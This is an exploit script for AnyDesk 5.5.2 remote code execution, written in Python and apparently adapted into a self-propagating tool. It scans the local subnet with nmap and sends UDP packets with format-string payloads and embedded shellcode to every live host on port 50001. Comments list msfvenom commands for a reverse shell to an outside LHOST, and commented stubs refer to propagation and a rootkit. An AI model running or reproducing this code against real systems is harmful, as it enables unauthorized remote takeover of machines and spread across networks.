# Exploit Title: AnyDesk 5.5.2 - Remote Code Execution
# Date: 09/06/20
# Exploit Author: scryh
# Vendor Homepage: https://anydesk.com/en
# Version: 5.5.2
# Tested on: Linux
# Walkthrough: https://devel0pment.de/?p=1881

#!/usr/bin/env python
import struct
import socket
import netifaces as ni
import subprocess
import ipaddress

# Function to get the network and subnet mask of the primary interface
def get_interface():
    gateways = ni.gateways()
    default_gateway = gateways['default'][ni.AF_INET][1]
    interface = gateways['default'][ni.AF_INET][1]
    return interface

def get_network(interface):
    addr = ni.ifaddresses(interface)[ni.AF_INET][0]
    network = ipaddress.IPv4Network((addr['addr'], addr['netmask']), strict=False)
    return network

def net_scan(network):
    try:
        print('Scanning Network')
        # Run nmap and pipe its output to awk
        command = f'nmap -oG - {network} | awk \'/Up$/{{print $2}}\''
        output = subprocess.check_output(command, shell=True, text=True)

        # Split the output by newlines to get a list of IPs
        ip_addresses = output.strip().split('\n')
        print('Done!', len(ip_addresses), 'Hosts are up')
        return ip_addresses
    except subprocess.CalledProcessError as e:
        return []


def gen_discover_packet(ad_id, os, hn, user, inf, func):
    d  = bytes([0x3e, 0xd1, 0x1])
    d += struct.pack('>I', ad_id)
    d += struct.pack('>I', 0)
    d += bytes([0x2, os])

    # Check if hn is a byte string or a regular string and handle accordingly
    if isinstance(hn, str):
        d += struct.pack('>I', len(hn)) + hn.encode()
    else:
        d += struct.pack('>I', len(hn)) + hn

    # Similar check for user, inf, and func
    if isinstance(user, str):
        d += struct.pack('>I', len(user)) + user.encode()
    else:
        d += struct.pack('>I', len(user)) + user

    d += struct.pack('>I', 0)

    if isinstance(inf, str):
        d += struct.pack('>I', len(inf)) + inf.encode()
    else:
        d += struct.pack('>I', len(inf)) + inf

    d += bytes([0])

    if isinstance(func, str):
        d += struct.pack('>I', len(func)) + func.encode()
    else:
        d += struct.pack('>I', len(func)) + func

    d += bytes([0x2, 0xc3, 0x51])
    return d


# msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.0.2.5 LPORT=4444 -b "\x00\x25\x26" -f python -v shellcode
# msfvenom -p linux/x86/exec CMD='touch /Desktop/youarefucked.txt' -b "\x00\x25\x26" -f python -v shellcode
# msfvenom -p ...linux...http...exec... -b "\x00\x25\x26" -f python -v shellcode

shellcode =  b""
shellcode += b"\x48\x31\xc9\x48\x81\xe9\xf7\xff\xff\xff\x48"
shellcode += b"\x8d\x05\xef\xff\xff\xff\x48\xbb\x4b\x7a\x9c"
shellcode += b"\x3a\x77\xaa\xe9\xaa\x48\x31\x58\x27\x48\x2d"
shellcode += b"\xf8\xff\xff\xff\xe2\xf4\x03\xc2\xb3\x58\x1e"
shellcode += b"\xc4\xc6\xd9\x23\x7a\x05\x6a\x23\xf5\xbb\xcc"
shellcode += b"\x23\x57\xff\x6e\x29\xf8\x01\x8a\x4b\x7a\x9c"
shellcode += b"\x4e\x18\xdf\x8a\xc2\x6b\x55\xd8\x5f\x04\xc1"
shellcode += b"\x9d\xc5\x3b\x55\xe5\x55\x02\xcb\x9b\xcf\x2d"
shellcode += b"\x0f\xff\x51\x12\xce\xc7\xde\x33\x0e\x9c\x6c"
shellcode += b"\x20\xfe\xb7\xc0\x70\x22\x93\x3f\x77\xaa\xe9"
shellcode += b"\xaa"

#def run():
#    next_action = ""
#    data = ""
#    print("[+] Propagation module activated...")

try:
    interface = get_interface()
    network = get_network(interface)
    port = 50001  # Define the port to scan
    neighbors = net_scan(network)
    print('Lets attack')
    print('Brute all active Hosts on Port 50001')
    
    for ip in neighbors:
        p = gen_discover_packet(4919, 1, b'\x85\xfe%1$*1$x%18x%165$ln' + shellcode, b'\x85\xfe%18472249x%93$ln', 'ad', 'main')
        s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
        s.sendto(p, (ip, port))
        s.close()
        
except Exception as e:
    exit()

#    next_action = "rootkit"
#    return data, next_action
